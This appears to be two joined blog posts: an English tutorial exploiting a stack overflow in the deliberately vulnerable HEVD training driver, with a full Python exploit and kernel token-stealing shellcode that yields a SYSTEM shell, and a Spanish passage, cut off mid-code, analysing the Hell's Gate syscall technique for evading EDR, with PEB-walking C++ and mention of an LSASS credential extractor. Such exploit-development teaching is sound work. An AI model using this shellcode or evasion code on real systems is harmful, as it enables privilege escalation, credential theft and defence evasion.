Once opened select File then Kernel Debug....\nOnce selected a window will pop up, navigate to the COM tab and enter the following (as per your configuration).\nThen hit OK. If you\u0026rsquo;ve not already done so boot into the target computer, and once we\u0026rsquo;ve loaded into the debugging entry, we previously added you should see the following.\nYou now have kernel debugging setup! Now\u0026hellip; as an exercise, do this again on Windows 7.\nIntroduction to HEVD # By now you should have learned how to setup kernel debugging that said ensure that you have downloaded HEVD, OSRLOADER, and Python onto the target computer or debugee machine.\nThe first time you load HEVD you\u0026rsquo;re going to launch OSRLOADER.exe, be sure to run it as an administrator. You should see the following:\nOnce launched hit the Browse button and navigate to the appropriate HEVD driver and open it.\nTo ensure the driver is loaded on boot, go ahead and select Automatic from the drop down of the Service Start settings. Upon completion hit Register Service, then Start Service. You should see the following message:\nReturning to our attached debugger, if you break and list the loaded modules you should see HEVD.\nThe next thing we\u0026rsquo;ll need to do is fix the symbols.\nTake note of that path: C:\\projects\\hevd\\build\\driver\\vulnerable\\x86\\HEVD\\HEVD.pdb we\u0026rsquo;ll need to create it on the host computer, and we\u0026rsquo;ll need to copy all the files over like so:\nOnce done, reboot the machine. If everything went well this time you should see the following:\nWorking with Device Drivers # Device drivers are kernel mode objects so we cannot directly modify them from user mode. In order to interact with drivers, we need to obtain a HANDLE for them. To do this we need to use a symbolic link such as \\\\Driver and pass it into CreateFileA.\nOnce we\u0026rsquo;ve obtained a handle, we can use DeviceIoControl function to obtain a device input and output control (IOCTL) interface. This interface can send control codes to the device driver, each control code represents an operation for the driver to perform. For example, a control code can ask the device to carry out an action such as formatting a disk.\nLet\u0026rsquo;s look at where we can find the information needed to perform these calls within HEVD.\nWorking with HEVD, Ghidra and WinDbg # So if we load the HEVD.sys file into ghidra we can see that the entry point of the driver really begins at DriverEntry(). This function is the first routine that is called when the driver is loaded and holds the responsibility of initializing the driver.\nIf we enter this function the picture becomes more clear.\nLet\u0026rsquo;s take a look at this using WinDbg, to do so reboot the machine and set a breakpoint on the entrypoint before the driver is loaded. You should then hit the breakpoint.\nIf you continue to unassemble from here (u command) you should eventually see the call to IoCreateSymbolicLink. This function will create the symbolic link we can call upon from user-mode.\nIf we print the first argument, we can see the name of the symbolic link is going to be HackSysExtremeVulnerableDriver.\nWe can ignore \\\\DosDevices as this is a special namespace that Windows uses for the device driver. To interact with it we\u0026rsquo;ll be using \\\\.\\HackSysExtremeVulnerableDriver, we use \\\\.\\ since this the \u0026ldquo;Win32 device namespace\u0026rdquo; or \u0026ldquo;raw device namespace\u0026rdquo; that we can use from userland. Although we did not need to step though this, I wanted to see what arguments would be passed into the function when creating the Symbolic Link.\nSo how do we send data to HEVD? As prevously mentioned, we\u0026rsquo;re going to be using DeviceIoControl. As a recap, below is the parameters used by the function.\nThe main thing we want to focus on is the dwIoControlCode parameter. This will be the \u0026ldquo;command\u0026rdquo; that we want the driver to execute. These \u0026ldquo;commands\u0026rdquo; or requests are sent to the device via I/O request packets also known as IRPs.\nLooking back at the Ghidra decompilation on line 31 we see that param_1-\u0026gt;MajorFunction[0xe] is set to IrpDeviceIoCtlHandler. Why? If we look at MSDN we see the following structure definition for this particular object (__DRIVER_OBJECT).\nSetting this indicates IrpDeviceIoCtlHandler will be the \u0026ldquo;function\u0026rdquo; that controls how the device can be interacted with. We know this based on the IRP Major Function Code 0xE as shown below (this is the index Windows will check for, currently I\u0026rsquo;m looking at this as the \u0026ldquo;main\u0026rdquo; function).\nIf we double click on IrpDeviceIoCtlHandler within Ghidra we\u0026rsquo;re presented with a decompilation of this function. Here we can see that HEVD uses a switch statement to handle our I/O requests.\nWith that we have everything needed to get started with Exploit Development.\nStack Overflow (Windows 7 - x86) # To ease into things why not start with a traditional buffer overflow. To further ease you into this I will also be using python. However, keep in mind that further into this series we will be using C and potentially C++.\nIdentifying the Vulnerability # Since we have symbols \u0026ldquo;reverse engineering\u0026rdquo; will be straight forward. Within the IrpDeviceIoCtlHandler we can see the stack buffer overflow can be triggered using the I/O control code 0x222003.\nIf we enter the function BufferOverflowStackIoctlHandler.\nWe ultimately make a call to TriggerBufferOverflowStack.\nLet\u0026rsquo;s make a proof of concept (PoC) to see what happens when we enter this function, for this tutorial we will be using python.\nimport struct import os from ctypes import * GENERIC_READ = 0x80000000 GENERIC_WRITE = 0x40000000 OPEN_EXISTING = 0x00000003 FILE_ATTRIBUTE_NORMAL = 0x00000080 NULL = None def main(): kernel32 = windll.kernel32 hHEVD = kernel32.CreateFileA(b\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL) if (hHEVD == -1): print(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;) exit(-1) buffer = \u0026#34;wetw0rk\u0026#34; print(\u0026#34;[*] Calling control code 0x222003\u0026#34;) kernel32.DeviceIoControl(hHEVD, 0x222003, buffer, len(buffer), NULL, 0x00, byref(c_ulong()), NULL) main() Understanding BufferOverflowStackIoctlHandler # Let\u0026rsquo;s set a breakpoint on BufferOverflowStackIoctlHandler.\nLet\u0026rsquo;s try to see exactly what is passed into this function, we can start by dumping the stack frame.\nLooking at BufferOverflowStackIoctlHandler within Ghidra tells us these parameters are of type _IRP and _IO_STACK_LOCATION (we also previously saw this from the current stack frame in WinDbg)\nHowever, we\u0026rsquo;re only really using param_2 of type _IO_STACK_LOCATION. We can find this structure layout using the MS Documentation however, since it\u0026rsquo;s rather large I\u0026rsquo;ll only show the relevant portion below.\ntypedef struct _IO_STACK_LOCATION { UCHAR MajorFunction; UCHAR MinorFunction; UCHAR Flags; UCHAR Control; union { ... struct { ULONG OutputBufferLength; ULONG POINTER_ALIGNMENT InputBufferLength; ULONG POINTER_ALIGNMENT FsControlCode; PVOID Type3InputBuffer; } FileSystemControl; ... } Parameters; PDEVICE_OBJECT DeviceObject; PFILE_OBJECT FileObject; PIO_COMPLETION_ROUTINE CompletionRoutine; PVOID Context; } IO_STACK_LOCATION, *PIO_STACK_LOCATION; If we dump this in WinDbg we can see that (param_2-\u0026gt;Parameters).FileSystemControl.Type3InputBuffer is the pointer to our buffer.\nSo, when we enter TriggerBufferOverflowStack we rest assured that our input is being passed as param_1.\nUnderstanding TriggerBufferOverflowStack # Now that we understood param_1 of TriggerBufferOverflowStack is infact our buffer exploitation seems rather easy.\nAll we need to do is send over 2060 bytes and we should have memory corruption! Let\u0026rsquo;s update the PoC and send it!\nimport struct import os from ctypes import * GENERIC_READ = 0x80000000 GENERIC_WRITE = 0x40000000 OPEN_EXISTING = 0x00000003 FILE_ATTRIBUTE_NORMAL = 0x00000080 NULL = None def main(): kernel32 = windll.kernel32 hHEVD = kernel32.CreateFileA(b\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL) if (hHEVD == -1): print(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;) exit(-1) buffer = b\u0026#34;A\u0026#34; * 3000 print(\u0026#34;[*] Calling control code 0x222003\u0026#34;) kernel32.DeviceIoControl(hHEVD, 0x222003, buffer, len(buffer), NULL, 0x00, byref(c_ulong()), NULL) main() Once sent, we can see we have successfully overwritten the return address and we have gained control over the instruction pointer.\nKernel Shellcode?? # So, we got control over the instruction pointer, and we have a solid understanding of how. The question remains, how do we get code execution, or rather spawn a SYSTEM shell?\nWe\u0026rsquo;re gonna need shellcode, however we can\u0026rsquo;t just use any shellcode. Since we\u0026rsquo;re running under the context of the kernel one wrong move directly correlates to a blue screen of death (BSOD). To reach our goal, we\u0026rsquo;re going to be using a technique known as Token Stealing. Using this technique, we\u0026rsquo;ll be copying a token with SYSTEM privileges to our current process.\nLuckily for us HEVD comes with a few Payloads including this one. Let\u0026rsquo;s take a look at it within Payloads.c.\n186 VOID TokenStealingPayloadWin7Generic() { 187 // No Need of Kernel Recovery as we are not corrupting anything 188 __asm { 189 pushad ; Save registers state 190 191 ; Start of Token Stealing Stub 192 xor eax, eax ; Set ZERO 193 mov eax, fs:[eax + KTHREAD_OFFSET] ; Get nt!_KPCR.PcrbData.CurrentThread 194 ; _KTHREAD is located at FS:[0x124] 195 196 mov eax, [eax + EPROCESS_OFFSET] ; Get nt!_KTHREAD.ApcState.Process 197 198 mov ecx, eax ; Copy current process _EPROCESS structure 199 200 mov edx, SYSTEM_PID ; WIN 7 SP1 SYSTEM process PID = 0x4 201 202 SearchSystemPID: 203 mov eax, [eax + FLINK_OFFSET] ; Get nt!_EPROCESS.ActiveProcessLinks.Flink 204 sub eax, FLINK_OFFSET 205 cmp [eax + PID_OFFSET], edx ; Get nt!_EPROCESS.UniqueProcessId 206 jne SearchSystemPID 207 208 mov edx, [eax + TOKEN_OFFSET] ; Get SYSTEM process nt!_EPROCESS.Token 209 mov [ecx + TOKEN_OFFSET], edx ; Replace target process nt!_EPROCESS.Token 210 ; with SYSTEM process nt!_EPROCESS.Token 211 ; End of Token Stealing Stub 212 213 popad ; Restore registers state 214 } 215 } Let\u0026rsquo;s break this down line by line. On line 193 we clear out the EAX register. Next on line 193 we use the FS register to get the address of the current thread located at offset 0x124. We can see this within WinDbg.\nLet\u0026rsquo;s map out the structure, first we need the base address of the PCR (Processor Control Region), also known as the _KPCR from there we can easily traverse the structure and find the current thread.\nNext, we need to find the address of the _EPROCESS data structure (\u0026ldquo;Executive Process\u0026rdquo;). Each running process on a Windows system is associated with an EPROCESS structure. We can do this just like we did the _KCPR.\nNow let\u0026rsquo;s look at the next block of code within this Payload (Feel free to just follow along. At this point I began writing the shellcode stub):\nSearchSystemPID: mov eax, [eax + FLINK_OFFSET] ; Get nt!_EPROCESS.ActiveProcessLinks.Flink sub eax, FLINK_OFFSET cmp [eax + PID_OFFSET], edx ; Get nt!_EPROCESS.UniqueProcessId jne SearchSystemPID Here we\u0026rsquo;re extracting the forward link (FLINK) pointer from the current _EPROCESS structure, then subtracting the offset to the FLINK from EAX to have EAX then point to the next _EPROCESS structure in the linked list. We then compare the process ID of the _EPROCESS structure to 0x04 and if it\u0026rsquo;s not found we continue searching until we find a SYSTEM process.\nOnce we find a process, we simply replace the current processes token. This is almost like an egghunter but for tokens.\nmov edx, [eax + TOKEN_OFFSET] ; Get SYSTEM process nt!_EPROCESS.Token mov [ecx + TOKEN_OFFSET], edx ; Replace target process nt!_EPROCESS.Token ; with SYSTEM process nt!_EPROCESS.Token The full code can be seen below:\n[BITS 32 ] [SECTION .text] global _start _start: pushad xor eax, eax ; set ZERO mov eax, dword fs:[eax+0x124] ; nt!_KPCR.PcrbData.CurrentThread mov eax, [eax + 0x50] ; nt!_KTHREAD.ApcState.Process mov ecx, eax ; Copy current process _EPROCESS structure mov edx, 0x04 ; WIN 10 SYSTEM PROCESS PID SearchSystemPID: mov eax, [eax + 0xb8] ; nt!_EPROCESS.ActiveProcessLinks.Flink sub eax, 0xb8 cmp [eax + 0xb4], edx ; nt!_EPROCESS.UniqueProcessId jne SearchSystemPID mov edx, [eax + 0xf8] ; Get SYSTEM process nt!_EPROCESS.Token mov [ecx + 0xf8], edx ; Replace target process nt!_EPROCESS.Token popad Let\u0026rsquo;s look at this in the debugger, you can generate the shellcode using Sickle.\n$ python3 sickle.py -p windows/x86/kernel_token_stealer -f python3 -v shellcode # Bytecode generated by Sickle, size: 52 bytes shellcode = bytearray() shellcode += b\u0026#39;\\x60\\x31\\xc0\\x64\\x8b\\x80\\x24\\x01\\x00\\x00\\x8b\\x40\\x50\\x89\u0026#39; shellcode += b\u0026#39;\\xc1\\xba\\x04\\x00\\x00\\x00\\x8b\\x80\\xb8\\x00\\x00\\x00\\x2d\\xb8\u0026#39; shellcode += b\u0026#39;\\x00\\x00\\x00\\x39\\x90\\xb4\\x00\\x00\\x00\\x75\\xed\\x8b\\x90\\xf8\u0026#39; shellcode += b\u0026#39;\\x00\\x00\\x00\\x89\\x91\\xf8\\x00\\x00\\x00\\x61\u0026#39; Now let\u0026rsquo;s update the PoC as shown below:\nimport struct import os from ctypes import * GENERIC_READ = 0x80000000 GENERIC_WRITE = 0x40000000 OPEN_EXISTING = 0x00000003 FILE_ATTRIBUTE_NORMAL = 0x00000080 MEM_COMMIT = 0x00001000 MEM_RESERVE = 0x00002000 PAGE_EXECUTE_READWRITE = 0x00000040 NULL = None def main(): kernel32 = windll.kernel32 hHEVD = kernel32.CreateFileA(b\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL) if (hHEVD == -1): print(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;) exit(-1) # python3 sickle.py -p windows/x86/kernel_token_stealer -f python3 -v shellcode # Bytecode generated by Sickle, size: 52 bytes shellcode = bytearray() shellcode += b\u0026#39;\\x60\\x31\\xc0\\x64\\x8b\\x80\\x24\\x01\\x00\\x00\\x8b\\x40\\x50\\x89\\xc1\u0026#39; shellcode += b\u0026#39;\\xba\\x04\\x00\\x00\\x00\\x8b\\x80\\xb8\\x00\\x00\\x00\\x2d\\xb8\\x00\\x00\u0026#39; shellcode += b\u0026#39;\\x00\\x39\\x90\\xb4\\x00\\x00\\x00\\x75\\xed\\x8b\\x90\\xf8\\x00\\x00\\x00\u0026#39; shellcode += b\u0026#39;\\x89\\x91\\xf8\\x00\\x00\\x00\\x61\u0026#39; print(\u0026#34;[*] Allocating RWX memory\u0026#34;) ptrMemory = kernel32.VirtualAlloc(NULL, len(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE) print(\u0026#34;[*] Creating a char array to house shellcode\u0026#34;) buffer = (c_char * len(shellcode)).from_buffer(shellcode) print(\u0026#34;[*] Copying shellcode array into RWX memory\u0026#34;) kernel32.RtlMoveMemory(c_int(ptrMemory), buffer, len(shellcode)) ptrShellcode = struct.pack(\u0026#34;\u0026lt;L\u0026#34;, ptrMemory) buffer = b\u0026#34;A\u0026#34; * 2080 buffer += ptrShellcode print(\u0026#34;[*] Calling control code 0x222003\u0026#34;) kernel32.DeviceIoControl(hHEVD, 0x222003, buffer, len(buffer), NULL, 0x00, byref(c_ulong()), NULL) os.system(\u0026#34;cmd.exe\u0026#34;) main() Since we\u0026rsquo;re gonna be overwriting the return address, let\u0026rsquo;s break at BASE+OFFSET. We can get this from Ghidra.\nNow let\u0026rsquo;s apply this to WinDbg.\nWith the breakpoint set, let\u0026rsquo;s launch our exploit on the target machine. Once the breakpoint is hit, we can see that we\u0026rsquo;re about to return the allocated memory region and execute our shellcode (52 bytes).\nLet\u0026rsquo;s step into this (t) until we hit mov edx, 0x04. Once here ECX and EAX should contain pointers to _EPROCESS.\nThe next instruction moves the FLINK pointer into EAX.\nOnce done sub eax, 0xb8 executes (since we\u0026rsquo;re traversing active processes). This effectively positions eax to the start of the next _EPROCESS structure.\nLet\u0026rsquo;s set a breakpoint here and continue execution until the process _EPROCESS.UniqueProcessId is 0x04 (I did it raw so if we reboot it likely won\u0026rsquo;t resolve). Once found we can see that the jump won\u0026rsquo;t be executed!\nNow the code simply copies the token into our current _EPROCESS structure! It appears I was wrong in the last couple of notes this can be found in the owning process!\nSo, the reality is we don\u0026rsquo;t need to look too far once we have the current thread\u0026hellip; I was confused but it makes total sense now. Below is screenshot to recap!\nNow we can continue to execute our shellcode, but we get a segfault. Why?\nFixing The Crash # Looking at the state of registers it appears EBP is still corrupted. However more importantly we never return, let\u0026rsquo;s add a ret instruction to the shellcode and place a valid address into EBP and try again.\n┌──(wetw0rk㉿kali)-[/opt/Sickle/src] └─$ python3 sickle.py -a x86 -m asm_shell -f c [*] ASM Shell loaded for x86 architecture sickle \u0026gt; a pop ebp \u0026#34;\\x5d\u0026#34; // pop ebp sickle \u0026gt; a ret \u0026#34;\\xc3\u0026#34; // ret Once we update the PoC and send it, we still get a segfault. So, I decided to look at Ghidra and you can see that the ret operations is RET 0x8. Let\u0026rsquo;s try it!\nThe final exploit can be seen below:\nimport struct import os from ctypes import * GENERIC_READ = 0x80000000 GENERIC_WRITE = 0x40000000 OPEN_EXISTING = 0x00000003 FILE_ATTRIBUTE_NORMAL = 0x00000080 MEM_COMMIT = 0x00001000 MEM_RESERVE = 0x00002000 PAGE_EXECUTE_READWRITE = 0x00000040 NULL = None def main(): kernel32 = windll.kernel32 hHEVD = kernel32.CreateFileA(b\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL) if (hHEVD == -1): print(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;) exit(-1) shellcode = bytearray() # python3 sickle.py -a x86 -v shellcode -p windows/x86/kernel_token_stealer -f python3 -m pinpoint shellcode += b\u0026#39;\\x60\u0026#39; # pushal shellcode += b\u0026#39;\\x31\\xc0\u0026#39; # xor eax, eax shellcode += b\u0026#39;\\x64\\x8b\\x80\\x24\\x01\\x00\\x00\u0026#39; # mov eax, dword ptr fs:[eax + 0x124] shellcode += b\u0026#39;\\x8b\\x40\\x50\u0026#39; # mov eax, dword ptr [eax + 0x50] shellcode += b\u0026#39;\\x89\\xc1\u0026#39; # mov ecx, eax shellcode += b\u0026#39;\\xba\\x04\\x00\\x00\\x00\u0026#39; # mov edx, 4 shellcode += b\u0026#39;\\x8b\\x80\\xb8\\x00\\x00\\x00\u0026#39; # mov eax, dword ptr [eax + 0xb8] shellcode += b\u0026#39;\\x2d\\xb8\\x00\\x00\\x00\u0026#39; # sub eax, 0xb8 shellcode += b\u0026#39;\\x39\\x90\\xb4\\x00\\x00\\x00\u0026#39; # cmp dword ptr [eax + 0xb4], edx shellcode += b\u0026#39;\\x75\\xed\u0026#39; # jne 0x1014 shellcode += b\u0026#39;\\x8b\\x90\\xf8\\x00\\x00\\x00\u0026#39; # mov edx, dword ptr [eax + 0xf8] shellcode += b\u0026#39;\\x89\\x91\\xf8\\x00\\x00\\x00\u0026#39; # mov dword ptr [ecx + 0xf8], edx shellcode += b\u0026#39;\\x61\u0026#39; # popal shellcode += b\u0026#39;\\x5D\u0026#39; # pop ebp shellcode += b\u0026#39;\\xC2\\x08\\x00\u0026#39; # ret 0x8 print(\u0026#34;[*] Allocating RWX memory\u0026#34;) ptrMemory = kernel32.VirtualAlloc(NULL, len(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE) print(\u0026#34;[*] Creating a char array to house shellcode\u0026#34;) buffer = (c_char * len(shellcode)).from_buffer(shellcode) print(\u0026#34;[*] Copying shellcode array into RWX memory\u0026#34;) kernel32.RtlMoveMemory(c_int(ptrMemory), buffer, len(shellcode)) ptrShellcode = struct.pack(\u0026#34;\u0026lt;L\u0026#34;, ptrMemory) buffer = b\u0026#34;A\u0026#34; * 2080 buffer += ptrShellcode print(\u0026#34;[*] Calling control code 0x222003\\n\u0026#34;) kernel32.DeviceIoControl(hHEVD, 0x222003, buffer, len(buffer), NULL, 0x00, byref(c_ulong()), NULL) os.system(\u0026#34;cmd.exe\u0026#34;) main() Once sent, we have SYSTEM!\nSources # https://www.welivesecurity.com/2017/03/27/configure-windbg-kernel-debugging/ https://microsoft.public.windbg.narkive.com/MamhR9YH/win7-and-kpcr https://github.com/LordNoteworthy/windows-internals/blob/master/IRP%20Major%20Functions%20List.md https://youtu.be/Ca3dAXDdoz8?si=oN_DsgyLz-Z4fVYL ","date":"29 November 2024","externalUrl":null,"permalink":"/posts/0x00-introduction-to-windows-kernel-exploitation/","section":"Posts","summary":"","title":"0x00 - Introduction to Windows Kernel Exploitation","type":"posts"},{"content":"Lo que sucede es mi análisis de la Puerta del Infierno, un código maligno. Este código maligno contiene técnicas que le da la capacidad de ejecutar llamadas de sistema (syscalls) en el sistema de operación Windows, con el objetivo de evadir detección de EDR (Defensas de las Empresas).\nUna vez completé mi análisis, creé mi propia implementación en C++ que usa llamadas de sistema (syscalls) que pertenecer adrento de ntdll.dll. Además, un método diferente de lo conocido públicamente para crear hashes. Todo esto para evadir técnicas modernas de detección para estos tipos de técnicas.\nExisten, más formas de optimización, sin embargo, para ahorrar tiempo, solo dos prueba de conceptos (PoC\u0026rsquo;s) fueron creados.\nEn el año 2024, un basico inyector de código que evade EDR En el año 2024, un LSASS extractor para recuperar contraseñas que evade Windows Defender El extractor de LSASS puede ser optimizado para evade EDR pero, dejo esto para servir como un ejercicio.\nTabla de Contenido # Descargo de Responsabilidad Entendiendo el Código Maligno Get NTDLL - La Entrada del Módulo Obtener la tabla de direcciones de exportación (EAT) para NTDLL Obteniendo Entendimiento de GetVxTableEntry() Obteniendo Entendimiento de Payload() Obteniendo Entendimiento de HellsGate Obteniendo Entendimiento de HellsDescent PoC | VALM - (Ezekiels Wheel) Recursos Descargo de Responsabilidad # Copyright 2024 Milton Valencia Por la presente se concede permiso, libre de cargos, a cualquier persona que obtenga una copia de este software y de los archivos de documentación asociados (el \u0026ldquo;Software\u0026rdquo;), a utilizar el Software sin restricción, incluyendo sin limitación los derechos a usar, copiar, modificar, fusionar, publicar, distribuir, sublicenciar, y/o vender copias del Software, y a permitir a las personas a las que se les proporcione el Software a hacer lo mismo, sujeto a las siguientes condiciones:\nEl aviso de copyright anterior y este aviso de permiso se incluirán en todas las copias o partes sustanciales del Software.\nEL SOFTWARE SE PROPORCIONA \u0026ldquo;COMO ESTÁ\u0026rdquo;, SIN GARANTÍA DE NINGÚN TIPO, EXPRESA O IMPLÍCITA, INCLUYENDO PERO NO LIMITADO A GARANTÍAS DE COMERCIALIZACIÓN, IDONEIDAD PARA UN PROPÓSITO PARTICULAR E INCUMPLIMIENTO. EN NINGÚN CASO LOS AUTORES O PROPIETARIOS DE LOS DERECHOS DE AUTOR SERÁN RESPONSABLES DE NINGUNA RECLAMACIÓN, DAÑOS U OTRAS RESPONSABILIDADES, YA SEA EN UNA ACCIÓN DE CONTRATO, AGRAVIO O CUALQUIER OTRO MOTIVO, DERIVADAS DE, FUERA DE O EN CONEXIÓN CON EL SOFTWARE O SU USO U OTRO TIPO DE ACCIONES EN EL SOFTWARE.\nEntendiendo el Código Maligno # Empecé bajando una copia de el código que contiene la técnica proporcionado por am0nsec. Quería romper esto línea por línea, empesando con la función main().\nINT wmain() { PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock(); PPEB pCurrentPeb = pCurrentTeb-\u0026gt;ProcessEnvironmentBlock; if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-\u0026gt;OSMajorVersion != 0xA) return 0x1; // Get NTDLL module PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-\u0026gt;LoaderData-\u0026gt;InMemoryOrderModuleList.Flink-\u0026gt;Flink - 0x10); // Get the EAT of NTDLL PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL; if (!GetImageExportDirectory(pLdrDataEntry-\u0026gt;DllBase, \u0026amp;pImageExportDirectory) || pImageExportDirectory == NULL) return 0x01; VX_TABLE Table = { 0 }; Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b; if (!GetVxTableEntry(pLdrDataEntry-\u0026gt;DllBase, pImageExportDirectory, \u0026amp;Table.NtAllocateVirtualMemory)) return 0x1; Table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f; if (!GetVxTableEntry(pLdrDataEntry-\u0026gt;DllBase, pImageExportDirectory, \u0026amp;Table.NtCreateThreadEx)) return 0x1; Table.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37; if (!GetVxTableEntry(pLdrDataEntry-\u0026gt;DllBase, pImageExportDirectory, \u0026amp;Table.NtProtectVirtualMemory)) return 0x1; Table.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb; if (!GetVxTableEntry(pLdrDataEntry-\u0026gt;DllBase, pImageExportDirectory, \u0026amp;Table.NtWaitForSingleObject)) return 0x1; Payload(\u0026amp;Table); return 0x00; } Parece que el primer paso es \u0026ldquo;Get NTDLL\u0026rdquo;.\nGet NTDLL - La Entrada del Módulo # Para comprender mejor cómo se logró esto usé el código presentado.\nint main() { PTEB pTeb = GetThreadEnvironmentBlock(); PPEB pPeb = pTEB-\u0026gt;ProcessEnvironmentBlock; std::cout \u0026lt;\u0026lt; \u0026#34;[*] Testing on OS Version: \u0026#34; \u0026lt;\u0026lt; pPeb-\u0026gt;OSMajorVersion \u0026lt;\u0026lt; std::endl; PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPEB-\u0026gt;LoaderData-\u0026gt;InMemoryOrderModuleList.Flink - 0x10); std::cout \u0026lt;\u0026lt; \u0026#34;[*] pLdrDataEntry: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; (uint64_t)pLdrDataEntry \u0026lt;\u0026lt; std::endl; getchar(); return 0; } Por el bein de tiempo estructuras (structures) sólo serán mencionado cuando es relevante. Una vez que lo ejecutamos, vemos esto:\nC:\\Users\\developer\\Desktop\u0026gt;hg.exe [*] Testing on OS Version: 10 [*] pLdrDataEntry: 0x26f94d06020 Pero\u0026hellip; qué es esto? Si nos detenemos en WinDbg, podemos llegar al PEB usando !process 0 0 hg.exe. Donde debemos concentrarnos es en el InMemoryOrderModuleList.\nPodemos ver que esto es muy similar a lo que vimos antes. Además, si restamos 0x10 de esta dirección, vemos que son similares.\nA primer vista, esto no los dice mucho. Sin embargo, cada entrada de la lista en realidad está envuelta en una estructura de LDR_DATA_TABLE_ENTRY. Entonces, podemos obtener más contexto sacando la estructura ubicada en el puntero de FLINK.\nLa información presentada confirma que esta es la entrada al módulo NTDLL. En esencia esto:\nUtilice el registro GS para obtener la dirección de el TEB El TEB contiene la dirección para el PEB Con el PEB podemos obtener la dirección a la estructura PEB_LDR_DATA Usando el PEB_LDR_DATA podemos obtener el InMemoryOrderModuleList Podemos proceder a implementar código para recorrer la lista doblemente enlazada utilizando nuestro nuevo conocimiento. Es aconsejable hacerlo asi, porque no tenemos garantía de que ntdll.dll siempre estará cargado a distancia -0x10.\nint main() { PTEB pTeb = NULL; PPEB pPeb = NULL; PLIST_ENTRY pEntry = NULL; PLIST_ENTRY pHeadEntry = NULL; PPEB_LDR_DATA pLdrData = NULL; PLDR_DATA_TABLE_ENTRY pLdrEntry = NULL; PLDR_DATA_TABLE_ENTRY pLdrDataTableEntry = NULL; /* Get the TEB */ pTeb = GetThreadEnvironmentBlock(); /* Get the PEB */ pPeb = pTeb-\u0026gt;ProcessEnvironmentBlock; /* OS Version Detection Omitted */ std::cout \u0026lt;\u0026lt; \u0026#34;[*] Testing on OS Version: \u0026#34; \u0026lt;\u0026lt; pPeb-\u0026gt;OSMajorVersion \u0026lt;\u0026lt; std::endl; /* Obtain a pointer to the structure that contains information about the loaded modules for a given process */ pLdrData = pPeb-\u0026gt;LoaderData; /* Get the pointer to the InMemoryOrderModuleList which is a doubly-linked list that contains the loaded modules for the process */ pHeadEntry = \u0026amp;pLdrData-\u0026gt;InMemoryOrderModuleList; /* Iterate over the InMemoryOrderModuleList */ std::wcout \u0026lt;\u0026lt; L\u0026#34;\\nInMemoryOrderModuleList\\n\u0026#34; \u0026lt;\u0026lt; std::endl; std::wcout \u0026lt;\u0026lt; L\u0026#34;\\tBase\\t\\t\\tModule\\n\u0026#34; \u0026lt;\u0026lt; std::endl; for (pEntry = pHeadEntry-\u0026gt;Flink; pEntry != pHeadEntry; pEntry = pEntry-\u0026gt;Flink) { pLdrDataTableEntry = (PLDR_DATA_TABLE_ENTRY)pEntry; std::wcout \u0026lt;\u0026lt; L\u0026#34;\\t\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; pLdrDataTableEntry-\u0026gt;DllBase \u0026lt;\u0026lt; L\u0026#34;\\t\u0026#34; \u0026lt;\u0026lt; pLdrDataTableEntry-\u0026gt;FullDllName.Buffer \u0026lt;\u0026lt; std::endl; } getchar(); return 0; } Que bueno, podemos ver que nuestro código funciona.\nSin embargo, todavía necesitamos que devuelva el valor original del código que bajamos. este valor es la dirección de la LIST_ENTRY. Modifiquemos nuestro código una vez más, esta vez creando una función para obtener la entrada dinámicamente.\nAl escribir esto, observé que el último código que escribimos era incorrecto para analizar cada entrada. Para alcanzar adecuadamente una entrada LDR_DATA_TABLE_ENTRY, nosotros debemos restar 0x10 del módulo que encontramos porque la dirección de el Flink NO ES el primer miembro de la estructura.\nPLDR_DATA_TABLE_ENTRY GetNtdllTableEntry() { PTEB pTeb = NULL; PPEB pPeb = NULL; DWORD dwModuleHash = 0x00; DWORD dwDllNameSize = 0x00; DWORD dwRorOperations = 0x00; PLIST_ENTRY pEntry = NULL; PLIST_ENTRY pHeadEntry = NULL; PPEB_LDR_DATA pLdrData = NULL; PLDR_DATA_TABLE_ENTRY pLdrEntry = NULL; PLDR_DATA_TABLE_ENTRY pLdrDataTableEntry = NULL; /* Get the TEB */ pTeb = GetThreadEnvironmentBlock(); /* Get the PEB */ pPeb = pTeb-\u0026gt;ProcessEnvironmentBlock; /* Obtain a pointer to the structure that contains information about the loaded modules for a given process */ pLdrData = pPeb-\u0026gt;LoaderData; /* Get the pointer to the InMemoryOrderModuleList which is a doubly-linked list that contains the loaded modules for the process */ pHeadEntry = \u0026amp;pLdrData-\u0026gt;InMemoryOrderModuleList; /* Iterate over the InMemoryOrderModuleList and identify NTDLL */ for (pEntry = pHeadEntry-\u0026gt;Flink; pEntry != pHeadEntry; 